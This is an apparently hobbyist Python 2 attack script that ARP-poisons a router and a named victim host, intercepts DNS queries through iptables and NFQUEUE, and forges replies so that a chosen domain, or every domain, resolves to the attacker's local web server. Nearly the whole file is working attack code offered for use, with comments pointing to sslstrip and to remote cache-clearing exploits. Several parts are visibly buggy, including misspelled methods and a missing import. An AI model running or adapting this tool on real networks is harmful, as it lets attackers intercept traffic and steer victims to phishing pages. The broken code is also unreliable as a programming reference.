#!/usr/bin/python
from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import os, subprocess, shlex
import nfqueue, dns.resolver
from scapy.all import *
import argparse, socket
import threading
import signal, ssl, sys


def arg_parser():
	global domain
	global routerIP
	global victimIP
	global redirectto
	global spoofall
	global option
	global iface
	parser = argparse.ArgumentParser(prog=sys.argv[0], add_help=True)
	parser.add_argument("-i", "--iface", dest='iface', required=True,
                                help="Set the interface [-i wlan0] to currently in use. Check [ifconfig] for details")
	parser.add_argument("-o", "--option", dest='option', required=True,
				help="Set option for ARP usage for request [-o 1] or replies [-o 2].")
	parser.add_argument("-d", "--domain", dest='domain', required=True,
				help="Choose the domain to spoof. Example: -d facebook.com")
	parser.add_argument("-r", "--routerIP", dest='routerIP', required=True,
				help="Choose the router IP. Example: -r 192.168.0.1")
	parser.add_argument("-v", "--victimIP", dest='victimIP', required=True,
				help="Choose the victim IP. Example: -v 192.168.0.5")
	parser.add_argument("-t", "--redirectto", dest='redirectto', required=False,
			help="Optional argument to choose the IP to which the victim will be redirected \
        		otherwise defaults to attacker's local Apache server. Requires either the -d or -a argument. Example: -t 80.87.128.67")
        parser.add_argument("-a", "--spoofall", dest='spoofall', required=False,
			help="Spoof all DNS requests back to the attacker or use -r to specify an IP to redirect them to",
			action="store_true")
        args = parser.parse_args()

	iface = args.iface
	option = int(args.option)
	domain = args.domain
	routerIP = args.routerIP
	victimIP = args.victimIP
	redirectto = args.redirectto
	spoofall = args.spoofall

def localMAC(iface):
	command = 'ip link show %s' % iface
	args = shlex.split(command)
	p = subprocess.Popen(args, stdout=subprocess.PIPE)
	s = p.communicate()[0]
	etherMAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return etherMAC

def originalMAC(ip):
    ans,unans = arping(ip, verbose=False)
    for s,r in ans:
        return r[Ether].src

def poison(i, rIP, vIP, rMAC, vMAC, op):
	try:
 	  conf.iface=i
          conf.verb=0
	  while True:
		send(ARP(op=op, psrc=rIP, pdst=vIP, hwdst=vMAC))
    		send(ARP(op=op, psrc=vIP, pdst=rIP, hwdst=rMAC))
     		time.sleep(2)
  	except:
 	 	signal_handler()
    	 	restore(i, rIP, vIP, rMAC, vMAC, op)

def restore(i, rIP, vIP, rMAC, vMAC, op):
    	print 'Restoring ARP Tables...'
	conf.iface=i
        conf.verb=0
	time.sleep(2)
    	send(ARP(op=op, psrc=vIP, pdst=rIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=vMAC), count=3)
	time.sleep(2)
    	send(ARP(op=op, psrc=rIP, pdst=vIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=rMAC), count=3)
    	sys.exit('Everything Safely Flushed')

def ether_restore(dnsIP):
	# Need to figure out a way to clear the cache of the target so that
	# we can initiate the DNS spoofing more efficiently.
	# As of now the process only can send forged packets to addr that have not been
	# recently visited by the victim, then stored and saved by the browser.
	# The only way to get a successful is by clearing the browsers offline data and cache
	# of the site being spoofed. Either a remote exploit needs to be put in place or 
	# specialty crafted packet that is able to the job for us. Lots of testing....
#	dnscache = dns.resolver.Cache
#	dnscache.flush()
	print 'Experimental DNS Remote Reset of Borwser/Memmory Data Cache'

def signal_handler():
	print 'learing iptables, turning off IP forwarding..., and stopping server'
	#os.system('iptables -t nat -D PREROUTING -p tcp --in-interface %s --dport 80 -j REDIRECT --to-port 6666' % iface)
	os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE')
	os.system('sysctl -q net.ipv4.ip_forward=0')
	#os.system('killall sslstrip')
	#os.system('systemctl stop apache2')
	time.sleep(1)

def cb(payload):
	global localIP
	data = payload.get_data()
    	pkt = IP(data)
    	localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
	dnsIP = socket.gethostbyname(pkt[DNS].qd.qname)
	if not pkt.haslayer(DNSQR):
       		payload.set_verdict(nfqueue.NF_ACCEPT)
	else:
		if str(domain) in pkt[DNS].qd.qname:
			spoofed_pkt(payload, pkt, localIP)

		# Prevent SSL/TLS Corruption
		if str(domain) not in pkt[DNS].qd.qname:
			try:
				print 'Target trying another site: %s' % pkt[DNS].qd.qname
				ether_pkt(payload, pkt, dnsIP)
			except socket.gaierror:
				dnsIP = pkt[DNS].qd.qname

def spoofed_pkt(payload, pkt, rIP):
	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
       		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
               	DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
               	an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', rclass='IN', ttl=10, rdata=rIP))
	payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
	print '[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1]
#	if victimIP in spoofed_pkt:
#		s.connect((rIP, 80))
#		s.send(

def ether_pkt(payload, pkt, dnsIP):
	# Prevents the target from being aware of us and being blocked by SSL/TLS sites
	test_pkt= IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        	UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
        	DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', rclass='IN', ttl=10, rdata=dnsIP))
	payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(test_pkt), len(test_pkt))

class RequestHandler(SimpleHTTPRequestHandler):
	def do_POST(self):
		content_length=self.headers['Content-Header']
		self.rf.read(content_length).decode('utf-8')
		site=self.path[1:]
		self.send_reponse(301)
		self.extension_map.update({'.webapp': 'applicaton/x-web-app-manifest+json',});
		self.send_header('Location', urllib.unquote(site))
		self.end_headers()

class Queued(object):
    def __init__(self):
        self.q = nfqueue.queue()
        self.q.set_callback(cb)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        print '[*] Waiting for data'
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.process_pending(100)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'

def httpserv():
	os.chdir('/var/www/html/')
	cert='/root/ca/fd.crt'
	key='/root/ca/fd.key'
	http=HTTPServer(('', 80), RequestHandler)
	#if port == 443:
	#	http.socket = ssl.wrapper(http.socket, server_request=True, certfile=cert, keyfile=key)
	print http.socket.getpeername()
        #print "Serving HTTPS on", sa[0], "port", sa[1], "..."
	http.serve_forever()

def main(args):
    	global victimMAC, routerMAC
    	if os.geteuid() != 0:
        	sys.exit("[!] Please run as root")

	#os.system('iptables -t nat -A PREROUTING -p tcp --in-interface %s --dport 80 -j REDIRECT --to-port 6666' % args.iface)
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
 	os.system('sysctl -q net.ipv4.ip_forward=1')
	#os.system('sslstrip -f -l 6666')
    	#os.system('systemctl -q start apache2')

    	routerMAC = originalMAC(routerIP)
    	victimMAC = originalMAC(victimIP)
    	if routerMAC == None:
    	    	sys.exit("Could not find router MAC address. Closing....")
    	if victimMAC == None:
    	    	sys.exit("Could not find victim MAC address. Closing....")


    	print '[*] Router MAC %s' % (routerMAC)
    	print '[*] Victim MAC %s' % (victimMAC)
    	Queued()
    	rctr = threading.Thread(target=reactor.run, args=(False,))
    	rctr.daemon = True
    	rctr.start()
	poison(iface, routerIP, victimIP, routerMAC, victimMAC, option)


if __name__ == '__main__':
	main(arg_parser())
